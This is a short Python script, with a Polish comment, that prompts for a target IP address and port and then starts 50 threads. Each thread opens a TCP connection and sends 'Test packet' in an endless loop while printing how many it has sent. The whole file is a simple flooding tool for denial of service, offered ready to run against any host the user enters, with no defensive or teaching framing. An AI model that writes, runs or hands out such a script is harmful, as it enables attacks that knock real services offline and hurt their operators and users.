import socket
import threading

TARGET_IP = input("TARGET IP: ")
TARGET_PORT = int(input("OPEN PORT: "))
NUM_THREADS = 50

def send_packets():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # natychmiastowe wysyłanie
        count = 0
        while True:
            s.sendall(b"Test packet\n")
            count += 1
            if count % 10000 == 0:
                print(f"{threading.current_thread().name} sent {count} packets")
    except Exception as e:
        print(f"Error in {threading.current_thread().name}: {e}")

threads = []

for i in range(NUM_THREADS):
    t = threading.Thread(target=send_packets, name=f"T{i+1}")
    t.start()
    threads.append(t)

try:
    for t in threads:
        t.join()
except KeyboardInterrupt:
    print("\nStopped manually")
